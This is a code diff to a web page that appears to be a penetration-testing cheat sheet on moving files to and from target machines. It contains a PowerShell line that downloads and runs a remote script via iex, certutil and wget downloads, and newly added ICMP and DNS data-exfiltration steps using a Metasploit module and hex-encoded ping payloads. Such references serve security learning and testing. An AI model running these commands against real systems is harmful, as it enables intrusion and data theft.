@@ -87,7 +87,7 @@
                       <pre><code class=
                     "language-powershell">certutil.exe -urlcache -f https://x.x.x.x/file.txt file.txt
 Invoke-WebRequest “https://x.x.x.x:xxxx/file.ps1” -OutFile “file.ps1”
-iex (New-Object Net.Webclient).DownloadString(‘https://x.x.x.x:$port/file.ps1’​)
+iex (New-Object Net.Webclient).DownloadString(‘https://x.x.x.x:$port/file.ps1’)
 copy \\x.x.x.x\share\file.exe . #copy from remote smb share</code></pre>
                     </div>
                     <h3>Linux</h3>
@@ -114,7 +114,15 @@ sudo smbserver.py share . -smb2support #smb server
 #ssh
 scp -r user@x.x.x.x:{file.txt,file.exe} .
 #You can find wget installed on some windows machines that have commandline git
-wget https://x.x.x.x/file</code></pre>
+wget https://x.x.x.x/file
+#icmp
+msf5 > use auxiliary/server/icmp_exfil
+ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a
+#dns
+1.  Get the required data that needs to be transferred.
+2.  Encode the file.
+3.  Send the encoded characters as subdomain/labels.
+</code></pre>
                     </div>
                   </div>
                 </article>
